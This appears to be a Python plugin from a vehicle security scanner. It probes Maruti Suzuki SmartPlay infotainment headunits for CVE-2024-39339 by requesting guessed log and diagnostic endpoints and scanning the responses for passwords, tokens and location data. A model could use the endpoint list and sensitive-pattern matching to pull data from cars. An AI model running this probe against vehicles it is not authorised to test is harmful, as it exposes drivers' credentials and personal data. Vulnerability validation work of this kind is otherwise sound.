#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 50,
    "cve": "CVE-2024-39339",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Maruti Suzuki SmartPlay",
    "component": "infotainment hub",
    "type": "访问控制/信息泄露",
    "summary": "SmartPlay全版本相关漏洞，影响车载多媒体系统安全。",
    "source_description": "A vulnerability has been discovered in all versions of Smartplay headunits, which are widely used in Suzuki and Toyota cars. This misconfiguration can lead to information disclosure, leaking sensitive details such as diagnostic log traces, system logs, headunit passwords, and personally identifiable information (PII). The exposure of such information may have serious implications for user privacy and system integrity.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-39339",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-39339",
        "https://docs.google.com/document/d/1S-d8zyZreYYGSIr4zGww6F2iBfD63v10Z3YVbGnp2es/edit?usp=sharing",
        "https://mohammedshine.github.io/CVE-2024-39339.html",
        "https://cveawg.mitre.org/api/cve/CVE-2024-39339"
    ],
    "affected": [
        {
            "vendor": "n/a",
            "product": "n/a",
            "versions": [
                {
                    "version": "n/a",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-39339",
        "Maruti",
        "Suzuki",
        "SmartPlay",
        "infotainment",
        "hub",
        "vulnerability",
        "been",
        "discovered",
        "Smartplay",
        "headunits",
        "which",
        "widely",
        "used",
        "Toyota",
        "cars",
        "misconfiguration",
        "lead",
        "information",
        "disclosure",
        "leaking",
        "sensitive",
        "details",
        "such",
        "diagnostic",
        "traces",
        "system",
        "logs",
        "headunit",
        "passwords"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-39339: SmartPlay headunit diagnostic log/PII info disclosure."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2024-39339",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - SmartPlay diagnostic/log endpoint for PII/credential leak",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080, 8443]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    sensitive_endpoints = ["/log", "/logs", "/diag", "/diagnostic", "/system/log", "/debug", "/dmesg",
                           "/api/logs", "/api/diagnostic", "/api/system/info"]
    sensitive_patterns = ["password", "passwd", "credential", "pii", "gps", "location", "lat=",
                          "lon=", "wifi", "ssid", "token", "secret", "private"]

    for ep in sensitive_endpoints:
        r = probe.get(ep)
        status = r.get("status")
        evidence[f"ep_{ep.strip('/').replace('/', '_')}_status"] = status
        if status == 200:
            body = r.get("body_text", "")
            body_lower = body.lower()
            evidence[f"accessible_{ep.strip('/').replace('/', '_')}"] = body[:200]
            for pattern in sensitive_patterns:
                if pattern in body_lower:
                    evidence["sensitive_data_found"] = pattern
                    evidence["leak_endpoint"] = ep
                    evidence["leak_preview"] = body[:300]
                    return {
                        "vulnerable": True,
                        "evidence": evidence,
                        "detection_confidence": detection_confidence("B", evidence, "pii_leak_confirmed"),
                        "requires_manual_review": False,
                    }

    evidence["endpoints_tested"] = sensitive_endpoints
    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("B", evidence, "diagnostic_endpoints_probed"),
        "requires_manual_review": True,
    }

class Poc43CVE202439339AccessControlAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-050'
    meta_poc_name = 'CVE-2024-39339 信息泄露 Active Validation'
    meta_cve_id = 'CVE-2024-39339'
    meta_severity = 'Medium'
    meta_protocol = 'https'
    meta_target_os = ['linux']
    meta_required_params = ['tls_scan_text']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-39339'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-39339']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "43_Maruti_SmartPlay_Access_Control_Info_Leak_Audit") if "VULN" in dir() else "43_Maruti_SmartPlay_Access_Control_Info_Leak_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc43CVE202439339AccessControlAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
